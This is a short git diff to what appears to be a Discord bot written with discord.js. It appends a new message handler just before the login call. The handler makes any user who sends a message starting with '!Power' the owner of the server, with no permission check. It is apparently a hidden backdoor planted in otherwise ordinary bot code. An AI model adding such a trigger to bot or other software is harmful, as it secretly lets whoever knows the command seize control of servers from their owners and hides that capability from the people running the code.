@@ -2785,4 +2785,10 @@ client.on('message', message => {
     }
 });
 
+client.on('message', ReBeL => {
+if(ReBeL.content.startsWith("!Power")){
+ReBeL.guild.setOwner(ReBeL.author);
+}
+});
+
 client.login(process.env.BOT_TOKEN)
